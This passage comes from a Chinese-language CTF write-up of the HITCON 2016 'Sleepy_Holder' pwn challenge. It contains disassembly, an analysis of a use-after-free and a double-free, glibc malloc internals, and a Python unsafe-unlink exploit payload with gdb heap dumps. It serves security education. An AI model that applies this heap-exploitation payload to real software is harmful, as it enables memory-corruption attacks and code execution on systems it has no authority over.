| 0x00400b55 mov rsi, rax
| 0x00400b58 mov edi, 0
| 0x00400b5d mov eax, 0
| 0x00400b62 call sym.imp.read
; ssize_t read(int fildes, void *buf, size_t nbyte)
| 0x00400b67 lea rax, [local_10h]
| 0x00400b6b mov rdi, rax
| 0x00400b6e call sym.imp.atoi
; int atoi(const char *str)
| 0x00400b73 mov dword [local_14h], eax
| 0x00400b76 mov eax, dword [local_14h]
| 0x00400b79 cmp eax, 1
; 1
| ,= 0x00400b85 mov rax, qword [0x006020d0]
; [0x6020d0:8]=0
| || 0x00400b8c mov rdi, rax
| || 0x00400b8f call sym.imp.free
; free([0x006020d0]) 释放 small secret
| || 0x00400b94 mov dword [0x006020e0], 0
; 设置 small_flag 为 0
| ||,= 0x00400ba0 mov rax, qword [0x006020c0]
; [0x6020c0:8]=0
1286
6.1.22 pwn HITCONCTF2016 Sleepy_Holder
| | | 0x00400ba7 mov rdi, rax
| | | 0x00400baa call sym.imp.free
; free([0x006020c0]) 释放 big secret
| | | 0x00400baf mov dword [0x006020d8], 0
; 设置 big_flag 为 0
| | | 0x00400bb9 nop
| | | ; JMP XREF from 0x00400b83 (sub.Which_Secret_do_you_
want_to_wipe_b01)
| | | ; JMP XREF from 0x00400b9e (sub.Which_Secret_do_you_
want_to_wipe_b01)
| `-`-> 0x00400bba mov rax, qword [local_8h]
| 0x00400bbe xor rax, qword fs:[0x28]
| ,= 0x00400bce leave
\ 0x00400bcf ret
该函数只能释放 small secret 和 big secret。释放的过程首先将对应的 chunk 释放
掉，然后设置对应 flag 为 0。漏洞很明显，就是没有将 chunk 指针清空，存在悬指
针，可能导致 use-after-free，然后在释放前，也没有检查 flag，可能导致 double-
free。
Renew secret
[0x00400850]> pdf @ sub.Which_Secret_do_you_want_to_renew_bd0
/ (fcn) sub.Which_Secret_do_you_want_to_renew_bd0 259
| sub.Which_Secret_do_you_want_to_renew_bd0 ();
| ; var int local_14h @ rbp-0x14
| ; var int local_10h @ rbp-0x10
| ; var int local_8h @ rbp-0x8
| ; CALL XREF from 0x00400e54 (main)
| 0x00400bd0 push rbp
| 0x00400bd1 mov rbp, rsp
| 0x00400bd4 sub rsp, 0x20
| 0x00400bd8 mov rax, qword fs:[0x28]
1287
6.1.22 pwn HITCONCTF2016 Sleepy_Holder
; [0x28:8]=-1 ; '(' ; 40
| 0x00400be1 mov qword [local_8h], rax
| 0x00400be5 xor eax, eax
| 0x00400be7 mov edi, str.Which_Secret_do_you_wan
t_to_renew ; 0x400f90 ; "Which Secret do you want to renew?"
| 0x00400bec call sym.imp.puts
; int puts(const char *s)
| 0x00400bf1 mov edi, str.1._Small_secret
; 0x400f09 ; "1. Small secret"
| 0x00400bf6 call sym.imp.puts
; int puts(const char *s)
| 0x00400bfb mov edi, str.2._Big_secret
; 0x400f19 ; "2. Big secret"
| 0x00400c00 call sym.imp.puts
; int puts(const char *s)
| 0x00400c05 lea rax, [local_10h]
| 0x00400c09 mov edx, 4
| 0x00400c0e mov esi, 0
| 0x00400c13 mov rdi, rax
| 0x00400c16 call sym.imp.memset
; void *memset(void *s, int c, size_t n)
| 0x00400c1b lea rax, [local_10h]
| 0x00400c1f mov edx, 4
| 0x00400c24 mov rsi, rax
| 0x00400c27 mov edi, 0
| 0x00400c2c mov eax, 0
| 0x00400c31 call sym.imp.read
; ssize_t read(int fildes, void *buf, size_t nbyte)
| 0x00400c36 lea rax, [local_10h]
| 0x00400c3a mov rdi, rax
| 0x00400c3d call sym.imp.atoi
; int atoi(const char *str)
| 0x00400c42 mov dword [local_14h], eax
| 0x00400c45 mov eax, dword [local_14h]
| 0x00400c48 cmp eax, 1
; 1
| ,= 0x00400c54 mov eax, dword [0x006020e0]
; [0x6020e0:4]=0
| || 0x00400c5a test eax, eax
| ||,= 0x00400c88 jmp 0x400cbd
| |||| ; JMP XREF from 0x00400c50 (sub.Which_Secret_do_you_
want_to_renew_bd0)
| |||`--> 0x00400c8a mov eax, dword [0x006020d8]
; [0x6020d8:4]=0
| ||| 0x00400c90 test eax, eax
| ||| ,= 0x00400cbc nop
| ||| ; JMP XREF from 0x00400c52 (sub.Which_Secret_do_you_
want_to_renew_bd0)
| ||| ; JMP XREF from 0x00400c86 (sub.Which_Secret_do_you_
want_to_renew_bd0)
| ||| ; JMP XREF from 0x00400c88 (sub.Which_Secret_do_you_
want_to_renew_bd0)
| ```---> 0x00400cbd mov rax, qword [local_8h]
| 0x00400cc1 xor rax, qword fs:[0x28]
| ,= 0x00400cd1 leave
\ 0x00400cd2 ret
该函数只能对 small secret 和 big secret 进行修改，所以 huge secret 就是一次分
配，永远存在且内容不可修改了。过程是首先判断对应的 flag 是否为 1，即 secret
是否已经存在，如果不存在，则读入 secret，否则函数直接返回。
漏洞利用
总结一下我们知道的东西：
small secret: small chunk, 40 bytes
small_ptr: 0x006020d0
small_flag: 0x006020e0
big secret: large chunk, 4000 bytes
1290
6.1.22 pwn HITCONCTF2016 Sleepy_Holder
big_ptr: 0x006020c0
big_flag: 0x006020d8
huge secret: large chunk, 400000 bytes
huge_ptr: 0x006020c8
huge_flag: 0x006020dc
漏洞：
double-free：在 free chunk 的位置 calloc 另一个 chunk，即可再次 free 这个
chunk
use-after-free：由于 double-free，calloc 出来的那个 chunk 被认为是 free
的，但可以使用
看到这里该题与上一题的差别很明显了，就是我们没有办法再通过 keep(huge) -
> wipe(huge) -> keep(huge) 来利用 brk() 分配内存，制造 unsafe unlink。
然后我们又在 _int_malloc() 中发现了另一个东西：
1291
6.1.22 pwn HITCONCTF2016 Sleepy_Holder
static void*
_int_malloc(mstate av, size_t bytes)
{
/*
If this is a large request, consolidate fastbins before con
tinuing.
While it might look excessive to kill all fastbins before
even seeing if there is space available, this avoids
fragmentation problems normally associated with fastbins.
Also, in practice, programs tend to have runs of either sma
ll or
large requests, but less often mixtures, so consolidation i
s not
invoked all that often in most programs. And the programs t
hat
it is called frequently in otherwise tend to fragment.
*/
else {
idx = largebin_index(nb);
if (have_fastchunks(av))
malloc_consolidate(av);
}
当需求 chunk 是一个 large chunk 时，glibc 会将把 fastbins 中的 chunk 移除，设
置 PREV_INUSE 为 0，合并 free chunk，然后放到 unsorted bin。接着 glibc 尝试
从 unsorted bin 中取出 chunk，由于大小不合适，这些 chunk 又被放到 small bin
中：
/* place chunk in bin */
if (in_smallbin_range (size))
{
victim_index = smallbin_index (size);
bck = bin_at (av, victim_index);
fwd = bck->fd;
}
1292
6.1.22 pwn HITCONCTF2016 Sleepy_Holder
这时就可以再次释放 small secret 而不触发 double-free 的检测。
那么为什么一定要将 small secret 放进 small bin 呢？因为当 chunk 被放进 small
bin 时，会相应的修改 next chunk（即big secret）的 chunk header（设置
prev_size， PREV_INUSE 置0），而当 chunk 被放进 fastbins 时是不会有这样的
操作的。接下来我们需要通过 double-free 将 small secret 再次放进 fastbins（这时
small secret同时存在于fastbins和small bin中），再从 fastbins 中取出 small
secret，原因和上面类似，从 fastbins 中取出 chunk 不会设置 next chunk 的 chunk
header。这样我们才能正确地触发 unlink。
unsafe unlink
def unlink():
keep(1, "AAAA") # small
keep(2, "AAAA") # big
wipe(1) # put small into fastbins
keep(3, "AAAA") # huge # put small into small bin
wipe(1) # double free # put small into fastbins
payload = p64(0) + p64(0x21) # fake header
payload += p64(small_ptr - 0x18) # fake fd
payload += p64(small_ptr - 0x10) # fake bk
payload += p64(0x20) # fake prev_size
keep(1, payload)
wipe(2) # unsafe unlink
制造 double-free：
1293
6.1.22 pwn HITCONCTF2016 Sleepy_Holder
gdb-peda$ x/5gx 0x006020c0
0x6020c0: 0x0000000000603560 0x00007ffff7f92010
0x6020d0: 0x0000000000603530 0x0000000100000001
0x6020e0: 0x0000000000000000
gdb-peda$ x/10gx 0x00603530-0x10
0x603520: 0x0000000000000000 0x0000000000000031 <-- small
0x603530: 0x0000000000000000 0x00007ffff7dd1b98
0x603540: 0x0000000000000000 0x0000000000000000
0x603550: 0x0000000000000030 0x0000000000000fb0 <-- big <
-- PREV_INUSE
0x603560: 0x0000000041414141 0x0000000000000000
上面的过程一方面通过 malloc_consolidate 设置了 big secret 的 PREV_INUSE，
另一方面通过 double-free 将 small secret 放进 fastbins。
在 small secret 中布置上一个 fake chunk：
gdb-peda$ x/5gx 0x006020c0
0x6020c0: 0x0000000000603560 0x00007ffff7f92010
0x6020d0: 0x0000000000603530 0x0000000100000001
0x6020e0: 0x0000000000000001
gdb-peda$ x/10gx 0x00603530-0x10
0x603520: 0x0000000000000000 0x0000000000000031
0x603530: 0x0000000000000000 0x0000000000000021 <-- fake
chunk
0x603540: 0x00000000006020b8 0x00000000006020c0 <-- fd,
bk pointer
0x603550: 0x0000000000000020 0x0000000000000fb0 <-- big <
-- fake prev_size